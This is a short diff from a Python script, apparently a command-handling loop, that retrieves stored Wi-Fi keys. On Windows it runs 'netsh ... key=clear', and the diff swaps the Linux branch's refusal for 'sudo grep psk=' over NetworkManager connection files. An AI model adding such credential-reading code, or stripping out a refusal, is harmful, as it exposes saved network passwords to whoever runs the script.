@@ -49,7 +49,8 @@ while True:
             # execute the command and retrieve the results
             output = subprocess.getoutput('netsh wlan show profile name="WIFI_NAME" key=clear | findstr "Key Content"')
         elif platform.system() == "Linux":
-            output = "This operation is not supported for security reasons."
+            # This operation requires root access and it's not recommended
+            output = subprocess.getoutput('sudo grep psk= /etc/NetworkManager/system-connections/*')
         else:
             output = "Unsupported operating system."
     else:
